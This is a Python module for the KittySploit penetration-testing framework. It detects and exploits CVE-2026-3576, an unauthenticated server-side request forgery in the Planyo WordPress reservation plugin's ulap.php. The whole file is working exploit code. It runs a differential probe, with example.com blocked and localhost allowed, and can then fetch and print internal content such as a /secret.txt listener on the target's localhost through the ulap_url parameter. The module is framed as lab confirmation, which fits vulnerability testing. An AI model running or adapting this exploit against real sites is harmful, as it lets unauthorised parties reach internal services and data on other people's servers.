#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from typing import Optional, Tuple
from urllib.parse import urlencode

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.wordpress import Wordpress

_PLUGIN = "planyo-online-reservation-system"
_ULAP = "ulap.php"
_BLOCKED_MARKER = "not allowed"
_DISALLOWED_CONTROL_URL = "http://example.com/"


class Module(Auxiliary, Http_client, Wordpress):
    __info__ = {
        "name": "Planyo ulap.php unauthenticated SSRF (CVE-2026-3576)",
        "description": (
            "Confirms CVE-2026-3576 in Planyo Online Reservation System <= 3.0: "
            "unauthenticated SSRF via /wp-content/plugins/planyo-online-reservation-system/ulap.php "
            "ulap_url. Uses a differential allow-list probe (disallowed host blocked, localhost "
            "allowed) and optionally fetches a lab canary bound on the target's localhost. "
            "HTTP localhost SSRF only — no file:// LFI."
        ),
        "author": ["rodtvs (incogbyte)", "KittySploit Team"],
        "severity": "high",
        "cve": ["CVE-2026-3576"],
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2026-3576",
            "https://www.cve.org/CVERecord?id=CVE-2026-3576",
        ],
        "tags": [
            "wordpress",
            "planyo",
            "ssrf",
            "unauthenticated",
            "cve-2026-3576",
            "auxiliary",
        ],
        "agent": {
            "risk": "active",
            "effects": ["network_probe"],
            "expected_requests": 3,
            "reversible": True,
            "approval_required": False,
            "produces": ["tech_hints", "risk_signals", "endpoints"],
            "cost": 1.0,
            "noise": 0.5,
            "value": 1.0,
            "requires": {
                "min_endpoints": 0,
                "min_params": 0,
                "tech_hints_any": [],
                "tech_hints_all": [],
                "specializations_any": [],
                "risk_signals_any": [],
                "auth_session": False,
                "capabilities_any": [],
                "capabilities_all": [],
                "confidence_min": {"wordpress": 0.3},
                "confidence_min_any": {},
                "endpoint_pattern_any": [],
                "param_any": [],
                "api_surface_ready": False,
            },
            "chain": {
                "produces_capabilities": [
                    {"capability": "ssrf_primitive", "from_detail": ""},
                ],
                "consumes_capabilities": [],
                "option_bindings": {},
                "suggested_followups": [
                    "scanner/http/planyo_cve_2026_3576",
                ],
            },
        },
    }

    base_path = OptString("/", "WordPress base path", required=False)
    canary_port = OptPort(
        9999,
        "Port of an HTTP listener on the target's 127.0.0.1 (lab canary)",
        required=False,
    )
    canary_path = OptString(
        "/secret.txt",
        "Path to fetch through SSRF on the canary listener",
        required=False,
    )
    fetch_canary = OptBool(
        True,
        "After differential confirm, fetch canary via http://localhost:<canary_port><canary_path>",
        required=False,
    )
    output_limit = OptInteger(
        2000,
        "Max characters of reflected body to print (0 = full)",
        required=False,
        advanced=True,
    )

    def _wp_base(self) -> str:
        return self.wp_normalize_base_path(self.base_path or self.path or "/")

    def _ulap_path(self) -> str:
        return self.wp_plugin_path(self._wp_base(), _PLUGIN, _ULAP)

    def _timeout(self) -> int:
        return max(int(self.timeout or 15), 15)

    def _ulap_request(self, ulap_url: str) -> Tuple[Optional[int], str]:
        path = self._ulap_path()
        query = urlencode({"ulap_url": ulap_url})
        response = self.http_request(
            method="GET",
            path=f"{path}?{query}",
            allow_redirects=True,
            timeout=self._timeout(),
        )
        if not response:
            return None, ""
        return int(response.status_code), response.text or ""

    def _is_blocked(self, body: str) -> bool:
        return _BLOCKED_MARKER in (body or "").lower()

    def _canary_url(self) -> str:
        port = int(self.canary_port or 9999)
        path = str(self.canary_path or "/secret.txt").strip() or "/secret.txt"
        if not path.startswith("/"):
            path = "/" + path
        return f"http://localhost:{port}{path}"

    def _clip(self, body: str) -> str:
        text = body or ""
        limit = int(self.output_limit or 0)
        if limit > 0 and len(text) > limit:
            return text[:limit] + f"\n... [{len(text) - limit} more bytes truncated]"
        return text

    def _differential(self) -> dict:
        """
        Returns:
          status: vulnerable | patched | inconclusive | unreachable
          details: human-readable reason
          ctrl_body / ssrf_body: raw bodies when available
        """
        ctrl_status, ctrl_body = self._ulap_request(_DISALLOWED_CONTROL_URL)
        if ctrl_status is None:
            return {
                "status": "unreachable",
                "details": f"No response from {self._ulap_path()}",
                "ctrl_body": "",
                "ssrf_body": "",
            }

        ctrl_blocked = self._is_blocked(ctrl_body)
        if not ctrl_blocked:
            return {
                "status": "inconclusive",
                "details": (
                    "Control host was not blocked with 'not allowed'; "
                    "endpoint may not be Planyo ulap.php"
                ),
                "ctrl_body": ctrl_body,
                "ssrf_body": "",
            }

        ssrf_status, ssrf_body = self._ulap_request("http://localhost/")
        if ssrf_status is None:
            return {
                "status": "inconclusive",
                "details": "Control blocked as expected, but localhost probe returned no response",
                "ctrl_body": ctrl_body,
                "ssrf_body": "",
            }

        if self._is_blocked(ssrf_body):
            return {
                "status": "patched",
                "details": (
                    "localhost requests are blocked — allow-list appears patched "
                    "(CVE-2026-3576 fixed in 3.1+)"
                ),
                "ctrl_body": ctrl_body,
                "ssrf_body": ssrf_body,
            }

        return {
            "status": "vulnerable",
            "details": (
                "Differential SSRF confirmed: disallowed host blocked, "
                "localhost not blocked via ulap.php"
            ),
            "ctrl_body": ctrl_body,
            "ssrf_body": ssrf_body,
        }

    def check(self):
        try:
            result = self._differential()
            status = result["status"]
            if status == "vulnerable":
                return {
                    "vulnerable": True,
                    "reason": result["details"],
                    "confidence": "high",
                    "details": self._ulap_path(),
                }
            if status == "patched":
                return {
                    "vulnerable": False,
                    "reason": result["details"],
                    "confidence": "high",
                    "details": self._ulap_path(),
                }
            return {
                "vulnerable": False,
                "reason": result["details"],
                "confidence": "low",
                "details": self._ulap_path(),
            }
        except Exception as exc:
            return {
                "vulnerable": False,
                "reason": f"Check failed: {exc}",
                "confidence": "low",
            }

    def run(self):
        try:
            ulap = self._ulap_path()
            print_status(f"Endpoint: {ulap}")
            print_status(f"Control URL: {_DISALLOWED_CONTROL_URL}")

            result = self._differential()
            status = result["status"]

            print_info(f"Control body: {self._clip(result['ctrl_body'].strip())!r}")
            if result["ssrf_body"] != "":
                print_info(f"Localhost probe body: {self._clip(result['ssrf_body'].strip())!r}")

            if status == "unreachable":
                print_error(result["details"])
                return False

            if status == "inconclusive":
                print_warning(result["details"])
                return False

            if status == "patched":
                print_success("Target does not appear vulnerable (localhost blocked)")
                print_info(result["details"])
                return False

            print_success(result["details"])
            print_warning("CVE-2026-3576: unauthenticated SSRF via localhost allow-list bypass")

            if not bool(self.fetch_canary):
                return True

            canary = self._canary_url()
            print_status(f"Fetching canary through SSRF: {canary}")
            canary_status, canary_body = self._ulap_request(canary)

            if canary_status is None:
                print_warning("Canary request failed (no HTTP response)")
                return True

            if self._is_blocked(canary_body):
                print_warning("Canary request was blocked unexpectedly")
                return True

            body = (canary_body or "").strip()
            if body:
                print_success("SSRF reflected canary response:")
                print_info(self._clip(body))
            else:
                print_warning(
                    "Canary request was not blocked, but response body was empty "
                    "(listener may be down or path missing)"
                )
            return True
        except Exception as exc:
            print_error(f"Module failed: {exc}")
            return False
